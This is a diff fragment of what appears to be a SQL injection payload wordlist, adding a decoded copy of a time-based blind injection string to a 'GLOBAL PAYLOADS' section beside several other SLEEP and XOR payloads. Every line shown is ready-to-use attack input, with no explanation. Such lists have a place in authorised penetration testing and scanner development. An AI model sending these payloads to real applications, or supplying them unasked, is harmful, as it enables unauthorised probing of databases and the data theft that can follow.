@@ -121,6 +121,7 @@ POSTGRES SQLI PAYLOAD
 
 ##### GLOBAL PAYLOADS #####
 '+AND+(SELECT+2111+FROM+(SELECT(SLEEP(5)))AbKz)+AND+'jpmA'='jpmA
+' AND (SELECT 2111 FROM (SELECT(SLEEP(5)))AbKz) AND 'jpmA'='jpmA
 'XOR(select*from(select(sleep(7)))a)XOR'Z--%20-+
 'XOR(select*from(select(sleep(7)))a)XOR'Z-- -+
 
